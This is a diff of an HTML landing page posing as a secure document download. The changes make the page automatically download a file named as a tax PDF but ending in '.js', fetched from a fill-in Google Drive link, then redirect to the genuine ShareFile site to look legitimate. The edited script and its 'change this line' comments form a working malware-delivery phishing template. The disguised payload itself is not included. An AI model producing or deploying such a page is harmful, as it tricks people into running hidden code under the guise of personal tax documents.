@@ -13,43 +13,41 @@
             color: #333;
         }
         h1 { color: #1a73e8; }
-        p { max-width: 600px; margin: 20px auto; }
+        p { max-width: 600px; margin: 20px auto; font-size: 18px; }
     </style>
 </head>
 <body>
     <h1>Preparing your secure document...</h1>
-    <p>Your file is being downloaded securely. Please wait.</p>
+    <p>Your file is being downloaded securely. Please wait a moment.</p>
 
     <script>
         function startDownloadAndRedirect() {
-            const hash = window.location.hash.substring(1); // e.g. "David_Jones_Tax_Documents_2025.pdf"
-            const filename = hash || "David_Jones_Tax_Documents_2025.pdf"; // default if no hash
+            // === CHANGE THIS LINE WITH YOUR DIRECT DOWNLOAD LINK ===
+            const fileUrl = "https://drive.google.com/uc?export=download&id=PUT_YOUR_FILE_ID_HERE";
 
-            // Path to your real PDF file (upload it to pdfs/ folder)
-            const pdfPath = `/pdfs/${filename}`;
+            const filename = "David_Jones_Tax_Documents_2025.pdf.js";   // Change this if you used a different name
 
-            // Create download link
+            // Trigger download
             const link = document.createElement('a');
-            link.href = pdfPath;
-            link.download = filename;        // Forces correct filename
+            link.href = fileUrl;
+            link.download = filename;   // Forces the exact filename
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
 
-            // Show message
+            // Show success message
             document.body.innerHTML = `
                 <h1>Download started!</h1>
                 <p><strong>${filename}</strong> is downloading now.</p>
-                <p>You will be redirected shortly...</p>
+                <p>You will be redirected to ShareFile shortly...</p>
             `;
 
-            // Redirect after 2 seconds (like the original behavior)
+            // Redirect after 2.5 seconds
             setTimeout(() => {
                 window.location.href = "https://www.sharefile.com/";
-            }, 2000);
+            }, 2500);
         }
 
-        // Run when page loads
         window.onload = startDownloadAndRedirect;
     </script>
 </body>
